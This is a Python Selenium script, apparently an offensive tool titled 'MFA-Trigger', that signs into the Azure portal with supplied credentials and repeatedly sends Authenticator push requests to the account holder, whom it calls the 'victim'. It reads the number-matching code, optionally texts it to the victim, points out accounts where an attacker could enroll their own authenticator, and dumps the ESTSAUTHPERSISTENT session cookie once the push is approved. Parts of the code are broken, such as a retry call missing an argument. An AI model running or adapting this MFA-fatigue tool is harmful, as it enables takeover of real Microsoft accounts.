import csv
import argparse
from multiprocessing.connection import wait
# import phonenumbers
from operator import contains
from sys import exit
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from collections import OrderedDict

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--username', type=str, help='Specify username to trigger mfa', required=True)
parser.add_argument('-p', '--password', type=str, help='Specify password for the user', required=True)
parser.add_argument('-a', '--allcookies', type=bool, help='Return all cookies. By default only ESTSAUTHPERSISTENT is returnes', required=False)
parser.add_argument('-r', '--retry', type=bool, help='Retries 2 times if user did not respond or denied.', required=False)
parser.add_argument('-rc', '--retrycount', type=int, help='Set retry count. Default = 2', required=False)
parser.add_argument('-pn', '--phonenumber', type=str, help='Phone number for sending sms in case of number matching', required=False)
parser.add_argument('-s', '--sendsms', type=bool, help='Sending sms to victim.', required=False)


args = parser.parse_args()

username = args.username
password = args.password
allcookiesbool = args.allcookies
retrybool = args.retry
retrycount = args.retrycount
phonenumber = args.phonenumber
sendsms = args.sendsms

# if phonenumber != None:
#     parse_phonenumber = phonenumbers.parse(phonenumber)
#     if phonenumbers.is_possible_number(phonenumber) != True:
#         exit_program()

cookiesuccess = False

# Browser settings
options = webdriver.ChromeOptions()
options.add_argument('--ignore-ssl-errors=yes')
options.add_argument('--ignore-certificate-errors')
options.add_argument("-incognito")
#options.add_argument('--proxy-server=172.17.0.1:8080')
driver = webdriver.Remote(command_executor='http://localhost:4444/wd/hub',options=options)

# Colorized output during run
class text_colors:
    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


def print_banner():

    banner = []
    banner.append("███╗   ███╗███████╗ █████╗    ████████╗██████╗ ██╗ ██████╗  ██████╗ ███████╗██████╗")
    banner.append("████╗ ████║██╔════╝██╔══██╗   ╚══██╔══╝██╔══██╗██║██╔════╝ ██╔════╝ ██╔════╝██╔══██╗")
    banner.append("██╔████╔██║█████╗  ███████║█████╗██║   ██████╔╝██║██║  ███╗██║  ███╗█████╗  ██████╔╝")
    banner.append("██║╚██╔╝██║██╔══╝  ██╔══██║╚════╝██║   ██╔══██╗██║██║   ██║██║   ██║██╔══╝  ██╔══██╗")
    banner.append("██║ ╚═╝ ██║██║     ██║  ██║      ██║   ██║  ██║██║╚██████╔╝╚██████╔╝███████╗██║  ██║")
    banner.append("╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝")
    
    print("\n")
    for i in banner:
        print(i)

def exit_program():
    # if driver != None:
    driver.close()
    # if driver != None:    
    driver.quit()
    exit(0)

def find_element(self, type_, value):
    try:
        return self.wait.until(
            lambda driver: driver.find_element(getattr(By, type_), value)
        )
    except TimeoutException:
        return False

def startup():
    driver.delete_all_cookies()
    driver.maximize_window()
    # sleep(2)
    #navigate to login.microsoft.com or portal.azure.com
    # driver.get("https://login.microsoft.com")
    driver.get("https://portal.azure.com")
    #Click username field
    driver.find_element(By.ID, "i0116").click()
    #Submit username
    driver.find_element(By.ID, "i0116").send_keys(username)
    driver.find_element(By.ID, "i0116").send_keys(Keys.ENTER)
    verify_username()

# Verifies correctness of username. Continues to submitting password if valid username was entered.
def verify_username():
    sleep(0.5)
    js_get_element = "return document.getElementById('usernameError');"
    javascript_element = driver.execute_script(js_get_element)
    if javascript_element != None:
        js_get_content = "return document.getElementById('usernameError').textContent;"
        javascript_element_content = driver.execute_script(js_get_content)
        if str(javascript_element_content) == 'This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.':
            print("%s[Invalid Username] %s%s" % (text_colors.red, username, text_colors.reset))
            exit_program()
    else:
        submit_password()

#Submit password
def submit_password():
    sleep(0.5)
    driver.find_element(By.ID, "i0118").click()
    driver.find_element(By.ID, "i0118").send_keys(password)
    driver.find_element(By.ID, "i0118").send_keys(Keys.ENTER)
    src = driver.page_source
    if "Your account or password is incorrect" in src:
        print("%s[Incorrect password entered for user:] %s%s" % (text_colors.red, username, text_colors.reset))        
        exit_program()
    else: 
        check_update_password()
    
# Checks if password of user needs to be updated.
def check_update_password():
    sleep(1)
    js_get_element = "return document.getElementById('ChangePasswordDescription');"
    javascript_element = driver.execute_script(js_get_element)
    if javascript_element != None:
        print("%s[Password needs to be updated for:] %s%s" % (text_colors.red, username, text_colors.reset))
        exit_program()
    else:
        #Continues if password does not need to be updated
        click_trigger_phone_app_notification()    
    
# Picks MFA Authenticator app option out of multiple 2-factor authentication options
def click_trigger_phone_app_notification(): 

    sleep(1)
    js_get_element = "return document.getElementById('idDiv_SAOTCS_Title');"
    javascript_element = driver.execute_script(js_get_element)
    if javascript_element != None:
        # Optionally enable the understanding code snippet to build in extra check.
        # js_get_content = "return document.getElementById('idDiv_SAOTCS_Title').textContent;"
        # javascript_element_content = driver.execute_script(js_get_content)
        # if "Verify your" in str(javascript_element):
        driver.find_element(By.XPATH, "//div[@id='idDiv_SAOTCS_Proofs']/div/div/div/div[2]/div").click()
        print("Had to pick between SMS and Authenticator app, picked Authenticator app.")
        check_number_matching()
    else:
        check_number_matching()

def check_number_matching():
    print("Triggering MFA for " + username)
    sleep(1.5)
    js_get_element = "return document.getElementById('idRichContext_DisplaySign');"
    javascript_element = driver.execute_script(js_get_element)
    if javascript_element != None:
        js_get_content = "return document.getElementById('idRichContext_DisplaySign').textContent;"
        javascript_element_content = driver.execute_script(js_get_content)
        print("%s[Number matching enabled. The number:] %s%s" % (text_colors.green, javascript_element_content, text_colors.reset))
        if sendsms == True and phonenumber != None:
            print("%s[Sending sms containing number to match to phone number:] %s%s" % (text_colors.green, phonenumber, text_colors.reset))
        wait_for_user_mfa_approval()    
    else:
        #Continues if no number matching
        wait_for_user_mfa_approval()    

def wait_for_user_mfa_approval():
    for x in range(60):
        src = driver.page_source
        sleep(1)
        if "Approve sign in request" in src:
            print("Waiting for user")
        elif "Stay signed in" in src:
            dump_cookies()
            break
        
        # Check if pending MFA enrollment        
        js_get_element = "return document.getElementById('heading');"
        javascript_element = driver.execute_script(js_get_element)
        if javascript_element != None:
            js_get_content = "return document.getElementById('heading').textContent;"
            javascript_element_content = driver.execute_script(js_get_content)
            if str(javascript_element_content) == 'Help us protect your account' or 'More information required':
                print("%s[Pending MFA enrollment for:] %s You might be able to enroll your own Authenticator for this account!%s" % (text_colors.green, username, text_colors.reset))
                #print("%s[Maybe skippable :)] %s" % (text_colors.yellow, username, text_colors.reset))
                break

        #Check if request is denied
        js_get_element = "return document.getElementById('idDiv_SAASDS_Title');"
        javascript_element = driver.execute_script(js_get_element)
        if javascript_element != None:
            js_get_content = "return document.getElementById('idDiv_SAASDS_Title').textContent;"
            javascript_element_content = driver.execute_script(js_get_content)
            if str(javascript_element_content) == "Request denied":
                print("%s[User denied MFA request] %s%s" % (text_colors.red, username, text_colors.reset))  
                retry_mfa_trigger(retrybool, retrycount, cookiesuccess)
                break
        
        # Check if request is timed-out
        js_get_element = "return document.getElementById('idDiv_SAASTO_Title');"
        javascript_element = driver.execute_script(js_get_element)
        if javascript_element != None:
            js_get_content = "return document.getElementById('idDiv_SAASTO_Title').textContent;"
            javascript_element_content = driver.execute_script(js_get_content)
            if "hear from you" in str(javascript_element_content):
                print("%s[User waited too long.] %s%s" % (text_colors.red, username, text_colors.reset))
                global waitedtoolong
                waitedtoolong = True
                retry_mfa_trigger(retrybool, retrycount, cookiesuccess) 
                break
            else:
                print("Error here")
                break
        else:
            continue

def retry_mfa_trigger(retrybool, retrycount, cookiesuccess, waitedtoolong):
    if retrybool == True and cookiesuccess == False:
        if retrycount == None:
            retrycount = 2
        for i in range(1, retrycount+1):
            if cookiesuccess == True:
                exit_program()
            else: 
                print("%s[Retrying MFA request.] %s Retry: %s %s" % (text_colors.red, username, i, text_colors.reset))        
                if waitedtoolong == True:
                    driver.find_element(By.ID, "idA_SAASTO_Resend").click()
                else: 
                    driver.find_element(By.ID, "idA_SAASDS_Resend").click()
                sleep(1)
                check_number_matching()                    
                i+=1


def dump_cookies():
    print("Seems like we have the cookies!")
    cookies = driver.get_cookies()
    cookiename = "ESTSAUTHPERSISTENT"
    global cookiesuccess
    cookiesuccess = True
    if allcookiesbool == True:
        for cookie in cookies:
            print(cookie)
        print("\n")
        print("Successfully captured COOKIES for " + str(username)+"!")
        print("\n")
        print("\n")
        print("\n")
        print(cookies)
    else:
        print("Dumping only " + str(cookiename) + " cookie. Specify '-a True' to dump all cookies.")
        print(cookies[2])
        print("\n")
        print("Successfully captured COOKIES for " + str(username)+"!")

print_banner()

startup()

exit_program()